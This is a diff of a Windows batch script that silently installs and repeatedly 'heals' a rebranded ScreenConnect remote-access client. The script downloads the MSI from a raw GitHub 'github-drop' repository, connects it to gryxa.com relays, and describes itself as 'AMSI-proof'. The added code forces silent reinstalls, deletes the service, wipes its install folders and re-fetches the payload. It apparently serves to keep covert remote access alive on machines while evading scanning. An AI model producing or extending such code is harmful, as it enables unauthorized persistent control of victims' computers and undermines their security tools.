@@ -1,6 +1,7 @@
 @echo off
-rem OWN_GRYXA BUILD 20260804G11 - PowerShell-free Gryxa install (AMSI-proof fallback)
-rem G11: HEAL 1060: /i then /fa; /x+/i ONLY when no live gryxa.com relay (fixes registered-no-service).
+rem OWN_GRYXA BUILD 20260804G12 - PowerShell-free Gryxa install (AMSI-proof fallback)
+rem G12: HEAL 1060 wipe orphan FP dir + force re-fetch MSI before /x+/i (330MLRACE: /i exit0 still 1060).
+rem G11: HEAL 1060: /i then /fa; /x+/i ONLY when no live gryxa.com relay.
 rem G10: NEVER msiexec /x ProductCode on REINSTALL path (shared GUID killed other Gryxa FPs).
 rem G9: HEAL never msiexec /x (start-only or /i-if-1060). REINSTALL aborts if any gryxa.com relay RUNNING.
 rem G8: HEAL soft-starts first; never /x while relay Gryxa RUNNING (was killing online Guests).
@@ -27,10 +28,12 @@ set "LOCK=%WD%\gryxa_msi.lock"
 set "URL1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi"
 set "SVC=ScreenConnect Client (%GRYXA_FP%)"
 set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
+set "DIR86=%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)"
+set "DIR64=%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
-echo [%DATE% %TIME%] own_gryxa G11 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"
+echo [%DATE% %TIME%] own_gryxa G12 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"
 
 rem G10: OBSERVE blocks REINSTALL/mutate-/x only — still allow HEAL start + 1060 /i
 if exist "%WD%\observe.flag" (
@@ -224,7 +227,7 @@ if not errorlevel 1 (
       echo CURRENT_FP=!LIVE_FP!
       echo RELAY=update.gryxa.com
       echo UI=ui.gryxa.com
-      echo UPDATED=cmd-own_gryxa-G11-heal-start
+      echo UPDATED=cmd-own_gryxa-G12-heal-start
     ) >"%WD%\gryxa.cfg"
     exit /b 0
   )
@@ -244,12 +247,34 @@ sc start "%SVC%" >nul 2>&1
 timeout /t 12 /nobreak >nul
 call :FindLiveRelay
 if defined LIVE_FP goto :DoHealOk
-rem last resort: /x ONLY when no live gryxa.com relay anywhere, then /i
+rem reinstall-in-place (still no /x)
+echo [%DATE% %TIME%] heal_1060_reinstall_amus>>"%LOG%"
+msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=amus REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa_re.log"
+set "MSIEXIT=!ERRORLEVEL!"
+echo [%DATE% %TIME%] msiexec_re_exit=!MSIEXIT!>>"%LOG%"
+sc start "%SVC%" >nul 2>&1
+timeout /t 12 /nobreak >nul
 call :FindLiveRelay
 if defined LIVE_FP goto :DoHealOk
-echo [%DATE% %TIME%] heal_1060_x_then_i_no_live_relay>>"%LOG%"
+rem last resort: /x + wipe orphan FP dir + fresh MSI /i — ONLY when no live gryxa.com relay
+call :FindLiveRelay
+if defined LIVE_FP goto :DoHealOk
+echo [%DATE% %TIME%] heal_1060_x_wipe_then_i_no_live_relay>>"%LOG%"
 msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
 timeout /t 5 /nobreak >nul
+sc stop "%SVC%" >nul 2>&1
+sc delete "%SVC%" >nul 2>&1
+if exist "%DIR86%" (
+  echo [%DATE% %TIME%] wipe_orphan_dir86>>"%LOG%"
+  rmdir /s /q "%DIR86%" >nul 2>&1
+)
+if exist "%DIR64%" (
+  echo [%DATE% %TIME%] wipe_orphan_dir64>>"%LOG%"
+  rmdir /s /q "%DIR64%" >nul 2>&1
+)
+del /f /q "%MSI%" "%MSI%.tmp" >nul 2>&1
+call :FetchMsi
+if errorlevel 1 exit /b 2
 call :DoInstall
 call :FindLiveRelay
 if defined LIVE_FP goto :DoHealOk
@@ -262,7 +287,7 @@ echo [%DATE% %TIME%] heal_1060_ok fp=!LIVE_FP!>>"%LOG%"
   echo CURRENT_FP=!LIVE_FP!
   echo RELAY=update.gryxa.com
   echo UI=ui.gryxa.com
-  echo UPDATED=cmd-own_gryxa-G11-heal-i
+  echo UPDATED=cmd-own_gryxa-G12-heal-i
 ) >"%WD%\gryxa.cfg"
 exit /b 0
 
